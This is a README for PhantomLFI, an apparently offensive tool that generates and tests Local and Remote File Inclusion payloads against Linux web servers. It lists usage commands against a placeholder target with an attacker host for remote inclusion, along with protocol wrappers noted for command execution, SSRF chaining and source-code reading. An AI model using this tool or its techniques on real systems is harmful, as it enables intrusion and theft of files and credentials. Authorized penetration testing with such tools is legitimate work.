# PhantomLFI

**LFI / RFI Payload Generation & Testing Framework**

Done by **D4rk0ps**

---

## Overview

PhantomLFI is a modular framework for Local File Inclusion (LFI) and Remote File Inclusion (RFI) testing on Linux web servers. It can **test** if a target is vulnerable and return the working payload, or **generate** full payload lists.

## Features

- **`--test` mode** — Sends smart detection payloads to the target and tells you the exact working payload
- **LFI Payloads** — Directory traversal, PHP wrappers, encoding bypasses, log/config paths
- **RFI Payloads** — HTTP, HTTPS, FTP, FTPS, SFTP, Gopher, Dict, TFTP, LDAP, jar, netdoc, data://
- **Encoding Engine** — URL, double URL, null byte, Unicode, slash bypasses, case randomization
- **Linux focused** — Web server targets (Apache, Nginx, PHP sessions, SSH keys, /proc, /etc)

## Installation

```bash
git clone https://github.com/aabderrafie/PhantomLFI.git
cd PhantomLFI
pip install requests colorama   # requests needed for --test, colorama optional
```

## Usage

### Test if target is vulnerable (recommended first step)
```bash
python3 main.py --url "http://target.com/page.php?file=" --test
```
This sends ~30 curated payloads and reports which ones hit. Gives you the exact working payload.

### Generate LFI payloads
```bash
python3 main.py --url "http://target.com/page.php?file=" --lfi
```

### Generate RFI payloads
```bash
python3 main.py --url "http://target.com/page.php?file=" --rfi --attacker-host 10.10.14.5
```

### Generate all payloads and save to file
```bash
python3 main.py --url "http://target.com/page.php?file=" --all --depth 8 -o output/results.txt
```

## Options

| Flag | Description |
|---|---|
| `--url` | Base URL with injectable parameter (required) |
| `--test` | Test if target is vulnerable (sends requests) |
| `--lfi` | Generate LFI payloads |
| `--rfi` | Generate RFI payloads |
| `--all` | Generate LFI + RFI payloads |
| `--depth [1-10]` | Traversal depth (default: 6) |
| `--attacker-host` | Attacker IP for RFI (default: ATTACKER_IP) |
| `--timeout` | Request timeout for --test mode (default: 10s) |
| `-o / --output` | Save results to file |
| `--no-color` | Disable colored output |

## Project Structure

```
PhantomLFI/
├── main.py                 # CLI entry point
├── core/
│   ├── generator.py        # Central payload orchestrator
│   ├── tester.py           # Vulnerability detection (--test)
│   ├── encoders.py         # Encoding pipeline
│   ├── wrappers.py         # PHP wrapper payloads
│   ├── traversal.py        # Directory traversal payloads
│   ├── rfi.py              # RFI protocol payloads
│   └── utils.py            # Output & utilities
├── config/
│   └── default_targets.py  # Target file paths & protocols
└── output/
    └── (generated results)
```

## Supported Protocols

| Protocol | Type | Description |
|---|---|---|
| `http://` | RFI | Standard HTTP inclusion |
| `https://` | RFI | HTTPS inclusion |
| `ftp://` | RFI | FTP file inclusion |
| `ftps://` | RFI | FTPS file inclusion |
| `sftp://` | RFI | SFTP file inclusion |
| `gopher://` | RFI | SSRF chaining, Redis, SMTP |
| `dict://` | RFI | Redis, Memcached interaction |
| `tftp://` | RFI | TFTP file inclusion |
| `ldap://` | RFI | LDAP injection |
| `ldaps://` | RFI | LDAPS injection |
| `jar://` | RFI | Java archive inclusion |
| `netdoc://` | RFI | Java netdoc file read |
| `data://` | LFI/RFI | Inline code execution |
| `php://filter` | LFI | Source code read |
| `php://input` | LFI | POST-based injection |
| `expect://` | LFI | Command execution |
| `zip://` | LFI | Archive traversal |
| `phar://` | LFI | Deserialization |
| `file://` | LFI | Direct file access |

---

**Done by D4rk0ps**
